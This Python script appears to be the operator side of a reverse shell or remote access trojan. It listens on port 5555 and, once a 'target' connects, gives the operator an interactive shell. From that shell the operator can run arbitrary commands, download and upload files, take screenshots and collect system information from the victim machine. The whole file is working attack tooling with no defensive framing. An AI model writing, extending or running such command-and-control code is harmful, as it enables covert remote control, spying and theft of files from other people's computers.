import socket
import json
import os

# Reliable data transmission using JSON encoding
def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

# Reliable data reception using JSON decoding
def reliable_recv():
    data = ""
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue  # Keep receiving until complete JSON data is received

# Upload a file to the client
def upload_file(file_name):
    try:
        with open(file_name, "rb") as f:
            target.send(f.read())
    except FileNotFoundError:
        print("[!] File not found.")

# Download a file from the client
def download_file(file_name):
    with open(file_name, "wb") as f:
        target.settimeout(1)
        while True:
            try:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
            except socket.timeout:
                break
        target.settimeout(None)

# Handles communication with the connected target
def target_communication():
    while True:
        command = input(f"* Shell~{ip}: ")
        reliable_send(command)
        
        if command == "quit":
            break
        elif command == "clear":
            os.system("clear")
        elif command.startswith("cd "):
            pass
        elif command.startswith("download"):
            download_file(command[9:])
        elif command.startswith("upload"):
            upload_file(command[7:])
        elif command == "screenshot":
            print("[+] Capturing screenshot...")
            reliable_send("screenshot")
            download_file("screenshot.png")
            print("[+] Screenshot saved.")
        elif command == "sysinfo":
            print("[+] Fetching system info...")
            reliable_send("sysinfo")
            sys_info = reliable_recv()
            for key, value in sys_info.items():
                print(f"{key}: {value}")
        else:
            result = reliable_recv()
            print(result)

# Server setup
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("192.168.1.12", 5555))
print("[+] Listening for incoming connections...")
sock.listen(5)

# Accept incoming connection
target, ip = sock.accept()
print(f"[+] Target connected from: {ip}")
target_communication()
